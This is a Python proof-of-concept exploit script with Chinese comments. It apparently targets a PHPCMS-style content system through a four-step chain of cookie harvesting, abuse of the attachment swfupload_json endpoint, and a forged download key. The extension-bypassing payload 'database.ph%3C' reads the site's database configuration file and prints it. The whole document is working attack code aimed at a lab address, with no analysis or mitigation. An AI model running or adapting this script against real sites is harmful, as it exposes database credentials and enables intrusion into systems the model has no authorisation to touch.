import requests
from urllib.parse import quote
import re

def poc(url):
    try:
        payload = r'&id=1&m=1&f=caches/configs/database.ph%3C&modelid=1&catid=1&s=&i=1&d=1&'           #数据库文件的路径
        #payload = r'&id=1&m=1&f=uploadfile/2017.ph%3C&modelid=1&catid=1&s=&i=1&d=1&'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0'}
        cookies = {}
        enc_payload = ''

        #获取cookies
        step1 = '{}/install_package/index.php?m=wap&c=index&siteid=1'.format(url)
        print('step1: {}'.format(step1))
        for c in requests.get(url=step1, timeout=10,headers=headers).cookies:
            #print('c : {}'.format(c))
            if c.name[-7:] == '_siteid':
                userid_name = '{}_userid'.format(c.name[:6])
                userid_value = c.value
                #print(userid_name,userid_value)
                headers['Cookie'] = '{}={};{}={}'.format(userid_name,userid_value,c.name,c.value)
                #print(headers)
                

        #获取att_json
        step2 = '{}/install_package/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}'.format(url,quote(payload))
        print('step2: {}'.format(step2))
        for c in requests.get(url=step2,timeout=10,headers=headers).cookies:
            if c.name[-9:] == '_att_json':
                #print(c.name,c.value)
                enc_payload = c.value
                #print(enc_payload)


        #访问下载链接
        step3 = '{}/install_package/index.php?m=content&c=down&a=init&a_k={}'.format(url,enc_payload)
        print('step3: {}'.format(step3))
        res3 = requests.get(url=step3,timeout=10,headers=headers)
        #print(ret.text)
        ret = re.search(r'<a href="(.+)" class="xzs_btn"></a>',res3.text)
        #print(ret.group(1))

        #执行下载链接
        step4 = '{}/install_package/index.php{}'.format(url,ret.group(1))
        print('step4: {}'.format(step4))
        res4 = requests.get(url=step4,timeout=10,headers=headers)
        print(res4.text)
    except Exception as e:
        pass

poc('http://192.168.150.133')